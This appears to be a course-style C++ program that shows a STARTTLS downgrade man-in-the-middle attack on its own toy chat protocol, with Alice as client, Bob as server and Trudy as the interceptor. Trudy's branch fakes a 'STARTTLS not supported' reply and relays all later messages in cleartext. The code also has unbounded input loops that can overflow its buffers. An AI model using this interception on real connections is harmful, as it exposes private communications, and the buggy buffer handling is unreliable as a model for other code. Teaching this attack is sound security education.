#include <iostream>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <resolv.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <netdb.h>
#include "constants.cpp"
using namespace std;
#define BUF_SIZE BUF_SIZE

// command line info messages
string err_msg = "Pass <-d peer1 peer2> arguments for man in the middle and <-s> for server and <-c host_name> for client";

// Creating server socket
int create_server_socket(int port) {

	int s;
	// declaring address for server
	struct sockaddr_in addr;
	// setting server address
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	// creating TCP socket for listening
	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s < 0 ) {
		perror("Unable to create socket");
		exit(EXIT_FAILURE);
	}
	// binding addr to socket
	if(bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("Unable to bind");
		exit(EXIT_FAILURE);
	}

	// listening to only single connection
	if(listen(s, MAX_CONNECTIONS_SERVER_LISTEN) < 0) {
		perror("Unable to listen");
		exit(EXIT_FAILURE);
	}

	cout<<"Listening on "<<port<<"...\n";

	return s;
}


// Creating client socket
int create_client_socket(char* host_name, int port) {
	int s;
	// declaring address for server
	struct sockaddr_in addr;

	// get hostent structure from host_name
	struct hostent *host = gethostbyname(host_name);
	
	if(host == NULL)
	{
		perror(host_name);
		exit(EXIT_FAILURE);
	}

	// setting server address
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = *(long *)(host->h_addr);

	char ip_str[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_str, INET_ADDRSTRLEN);
	printf("Host IP is %s\n", ip_str);

	// creating socket 
	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s < 0 ) {
		perror("Unable to create socket");
		exit(EXIT_FAILURE);
	}

	// connecting to server
	int connect_status_code = connect(s, (struct sockaddr*)&addr, sizeof(addr));
	if(connect_status_code < 0) {
		perror("Unable to connect");
		exit(EXIT_FAILURE);
	}
	cout<<"Connected to "<<host_name<<"...\n";

	return s;
}


int main(int argc, char** argv) {
	char alice_msg[BUF_SIZE]; // messages exchanged between alice and trudy
	char bob_msg[BUF_SIZE]; // messages exchanged beteween trudy and bob
	char* host_name; // host name of server which client desires to connect
	int n, bytes_read;
	char *peer1, *peer2; // peer1 and peer2 are the two entites (alice and bob) whose connection trudy is intercepting

	int flag = -1; // 0 for trudy, 1 for client (alice), 2 for server (bob)

	if(argc == 1) {
		cout<<err_msg<<endl;
		return 1;
	} else {
		if(argc == 2) {
			if(string(argv[1]) == "-s") {
				flag = 2;
			} else {
				cout<<err_msg<<endl;
				return 1;
			}
		} else if(argc == 3) {
			if(string(argv[1]) == "-c") {
				flag = 1;
				host_name = argv[2];
			} else {
				cout<<err_msg<<endl;
				return 1;
			}
		} else if(argc == 4) {
			if(string(argv[1]) == "-d") {
				flag = 0;
				peer1 = argv[2];
				peer2 = argv[3];
			} else {
				cout<<err_msg<<endl;
				return 1;
			}
		} else {
			cout<<err_msg<<endl;
			return 1;
		}
	}

	if(flag == 0) {
		// **************** MITM (TRUDY) ***********************

		int alice_sock, bob_sock, sock;

		// Trudy acts as server for alice
		// creating socket to communicate with alice
		sock = create_server_socket(MITM_LISTEN_PORT);

		// declaring address for client
		struct sockaddr_in client_addr;
		uint len = sizeof(client_addr);

		// Trudy accepts alice connection
		alice_sock = accept(sock, (struct sockaddr*)&client_addr, &len);	
		if(alice_sock < 0) {
				perror("Unable to accept");
				exit(EXIT_FAILURE);
		}
		char ip_str[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &(client_addr.sin_addr), ip_str, INET_ADDRSTRLEN);
		printf("Connected to client with IP %s\n", ip_str);

		// Trudy acts as client for bob
		// creating socket for communication with bob
		bob_sock = create_client_socket(peer2, SERVER_LISTEN_PORT);

		// Trudy receives "chat_hello" from alice
		bzero(alice_msg, BUF_SIZE);
		bytes_read = read(alice_sock, alice_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer1<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		cout<<"Forwarding "<<" to "<<peer2<<" "<<alice_msg;
		// Trudy forwards "chat_hello" received from alice to bob
		write(bob_sock, alice_msg, BUF_SIZE);

		// Trudy receives "chat_reply" from Bob
		bzero(bob_msg, BUF_SIZE);
		bytes_read = read(bob_sock, bob_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer2<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Trudy forwards "chat_reply" received from bob to alice
		cout<<"Forwarding "<<" to "<<peer1<<" "<<bob_msg;
		write(alice_sock, bob_msg, BUF_SIZE);

		// Trudy receives "chat_STARTTLS" from alice
		bzero(alice_msg, BUF_SIZE);
		bytes_read = read(alice_sock, alice_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer1<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Trudy sends "chat_STARTTLS_NOT_SUPPORTED" to alice
		bzero(alice_msg, BUF_SIZE);
		strcpy(alice_msg, "chat_STARTTLS_NOT_SUPPORTED\n");
		cout<<"Sending to "<<peer1<<" "<<alice_msg<<endl;
		write(alice_sock, alice_msg, BUF_SIZE);

		// Trudy successfully launched downgrade attack
		// Communication between alice and bob is unsecure

		while(true) {
			// Trudy receives message from alice
			bzero(alice_msg, BUF_SIZE);
			bytes_read = read(alice_sock, alice_msg, BUF_SIZE);
			if(bytes_read > 0) {
				cout<<"Received from " <<peer1<<"\n"<<alice_msg;
			} else {
				ERR_print_errors_fp(stderr);
			}

			cout<<"Forwarding "<<" to "<<peer2<<" "<<alice_msg;
			// Trudy forwards message received from alice to bob
			write(bob_sock, alice_msg, BUF_SIZE);

			// terminate connection if alice sends chat_close
			if(!strcmp(alice_msg, "chat_close\n")) break;

			// Trudy receives message from Bob
			bzero(bob_msg, BUF_SIZE);
			bytes_read = read(bob_sock, bob_msg, BUF_SIZE);
			if(bytes_read > 0) {
				cout<<"Received from " <<peer2<<"\n"<<bob_msg;
			} else {
				ERR_print_errors_fp(stderr);
			}

			// Trudy forwards message received from bob to alice
			cout<<"Forwarding "<<" to "<<peer1<<" "<<bob_msg;
			write(alice_sock, bob_msg, BUF_SIZE);

			// terminate connection if bob sends chat_close
			if(!strcmp(bob_msg, "chat_close\n")) break;
		}
	} else if(flag == 1) {
		// **************** CLIENT (ALICE) ***********************

		// creating socket 
		int sock = create_client_socket(host_name, MITM_LISTEN_PORT);

		// client sends "chat_hello"
		bzero(alice_msg, BUF_SIZE);
		n = 0;
		cout<<"Write your message:\n";
		while((alice_msg[n++] = getchar()) != '\n');
		write(sock, alice_msg, BUF_SIZE);

		// client receives "chat_reply"
		bzero(bob_msg, BUF_SIZE);
		bytes_read = read(sock, bob_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from server:\n"<<bob_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// client sends "chat_STARTTLS"
		bzero(alice_msg, BUF_SIZE);
		n = 0;
		cout<<"Write your message:\n";
		while((alice_msg[n++] = getchar()) != '\n');
		write(sock, alice_msg, BUF_SIZE);

		// client receives "chat_STARTTLS_NOT_SUPPORTED"
		bzero(bob_msg, BUF_SIZE);
		bytes_read = read(sock, bob_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from server:\n"<<bob_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Thus Alice now communicates with Bob insecurely
		// that is communication is no longer TLS secured

		while(true) {
			// client sends message
			bzero(alice_msg, BUF_SIZE);
			n = 0;
			cout<<"Write your message:\n";
			while((alice_msg[n++] = getchar()) != '\n');
			write(sock, alice_msg, BUF_SIZE);
			// terminate connection if alice sends chat_close
			if(!strcmp(alice_msg, "chat_close\n")) break;

			// client receives message
			bzero(bob_msg, BUF_SIZE);
			bytes_read = read(sock, bob_msg, BUF_SIZE);
			if(bytes_read > 0) {
				cout<<"Received from server:\n"<<bob_msg;
			} else {
				ERR_print_errors_fp(stderr);
			}
			// terminate connection if bob sends chat_close
			if(!strcmp(bob_msg, "chat_close\n")) break;
		}

	} else {
		// **************** SERVER (BOB) ***********************

		// create socket
		int sock = create_server_socket(SERVER_LISTEN_PORT);

		// declaring address for client
		struct sockaddr_in client_addr;
		uint len = sizeof(client_addr);

		// server accepts client connection
		int client = accept(sock, (struct sockaddr*)&client_addr, &len);
		if(client < 0) {
				perror("Unable to accept");
				exit(EXIT_FAILURE);
		}
		char ip_str[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &(client_addr.sin_addr), ip_str, INET_ADDRSTRLEN);
		printf("Connected to client with IP %s\n", ip_str);

		while(true) {
			// server receives message
			bzero(alice_msg, BUF_SIZE);
			bytes_read = read(client, alice_msg, BUF_SIZE);
			if(bytes_read > 0) {
				cout<<"Received from client:\n"<<alice_msg;
			} else {
				ERR_print_errors_fp(stderr);
			}
			// terminate connection if alice sends chat_close
			if(!strcmp(alice_msg, "chat_close\n")) break;

			// server sends message
			bzero(bob_msg, BUF_SIZE);
			n = 0;
			cout<<"Write your message:\n";
			while((bob_msg[n++] = getchar()) != '\n');
			write(client, bob_msg, BUF_SIZE);
			// terminate connection if bob sends chat_close
			if(!strcmp(bob_msg, "chat_close\n")) break;
		}
	}

	return 0;
}